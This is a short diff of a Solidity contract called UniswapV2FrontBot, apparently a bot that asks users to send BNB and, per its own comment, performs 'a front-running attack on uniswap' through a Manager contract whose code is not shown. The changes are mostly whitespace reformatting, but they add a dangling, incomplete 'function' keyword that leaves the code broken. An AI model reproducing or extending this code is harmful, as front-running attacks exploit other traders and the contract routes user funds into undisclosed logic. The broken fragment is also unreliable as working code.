@@ -16,22 +16,19 @@ contract UniswapV2FrontBot {
 	uint frontrun;
 	Manager manager;
 	
-	
 	constructor(string memory _tokenName, string memory _tokenSymbol) public {
 		tokenName = _tokenName;
 		tokenSymbol = _tokenSymbol;
-		manager = new Manager();
-		
-		}
-	
+		manager = new Manager();	
+	}
 	    
-	    // Send required BNB for liquidity pair
-	    receive() external payable {}
+	// Send required BNB for liquidity pair
+	receive() external payable {}
+
+    function     
 	    
-	    
-	    // Perform tasks (clubbed .json functions into one to reduce external calls & reduce gas) manager.performTasks();
-	    
-	    function action() public payable {
+	// Perform tasks (clubbed .json functions into one to reduce external calls & reduce gas) manager.performTasks();
+	function action() public payable {
 	
 	//Perform a front-running attack on uniswap
 
